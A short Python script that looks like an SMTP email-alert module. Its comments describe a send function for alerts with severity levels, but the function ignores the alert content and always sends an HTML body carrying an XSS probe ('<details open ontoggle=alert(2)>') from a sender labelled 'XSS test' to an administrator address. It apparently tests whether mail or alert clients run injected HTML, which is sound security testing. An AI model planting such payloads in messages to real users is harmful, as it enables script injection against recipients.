from email import encoders
from email.header import Header
from email.mime.text import MIMEText
from email.utils import parseaddr, formataddr
import smtplib
import config


'''邮件发送模块  调用send函数接收 data为告警内容 level为告警级别   级别颜色在config.color中修改'''

conf = config.data1
col = config.color

def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, 'utf-8').encode(), addr))


def sendm(data,level=3):   #data为告警内容 html格式 level为告警级别  1 低级  2 中级 3 高级
    msg = MIMEText('<font size="5" color={}></font>    <br><details open ontoggle=alert(2)>', 'html', 'utf-8')
    msg['From'] = _format_addr('xss测试<%s>' % conf['from_addr'])
    msg['To'] = _format_addr('管理员 <%s>' % conf['to_addr'])
    msg['Subject'] = Header('111', 'utf-8').encode()
    server = smtplib.SMTP(conf['smtp_server'], 25)
    server.set_debuglevel(1)
    server.login(conf['from_addr'], conf['password'])
    server.sendmail(conf['from_addr'], [conf['to_addr']], msg.as_string())
    server.quit()


sendm(data='1')


